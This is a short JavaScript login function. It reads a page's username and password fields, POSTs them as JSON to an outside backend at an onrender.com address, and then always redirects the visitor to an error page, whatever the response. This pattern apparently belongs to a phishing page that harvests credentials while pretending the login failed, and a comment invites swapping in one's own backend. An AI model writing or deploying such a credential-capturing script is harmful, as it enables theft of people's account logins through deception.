
    function login() {
        const username = document.getElementById("username").value;
        const password = document.getElementById("password").value;

        fetch("https://backend-redf.onrender.com", {  // Replace with your actual backend URL
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({ username, password })
        })
        .then(response => response.json())
        .then(data => {
            console.log(data);
            window.location.href = "error.html"; // Redirect to error page
        })
        .catch(error => console.error("Error:", error));
    }

